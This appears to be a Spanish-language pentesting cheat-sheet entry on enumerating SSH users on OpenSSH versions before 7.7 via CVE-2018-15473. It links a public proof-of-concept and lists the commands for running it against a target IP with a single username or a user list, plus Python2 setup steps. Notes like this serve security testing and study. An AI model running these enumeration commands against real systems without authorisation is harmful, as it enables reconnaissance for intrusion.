# Enum usuarios (OpenSSH < 7.7)

Tags: #SSH 

## Python3

* [CVE-2018-15473](https://github.com/moften/cve-2018-15473-poc)

```bash 
❯ python3 cve-2018-15473-poc.py -t <target_ip> -u root            # Enumerar usuarios individuales 
	# root = Usuario a validar

❯ python3 cve-2018-15473-poc.py -t <target_ip> -U userlist.txt    # Enumerar usuarios de una lista 
```

## Python2
```bash 
# instalación 
❯ sudo apt install python2 -y
❯ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py && python2 get-pip.py
❯ pip2 install paramiko
```

```
# Descargar el 'OpenSSH < 7.7 User enumeration (2)'
❯ python2 ssh_enum.py <IP> root 2>/dev/null   # Enumerar usuarios
	# root = Usuario a validar
```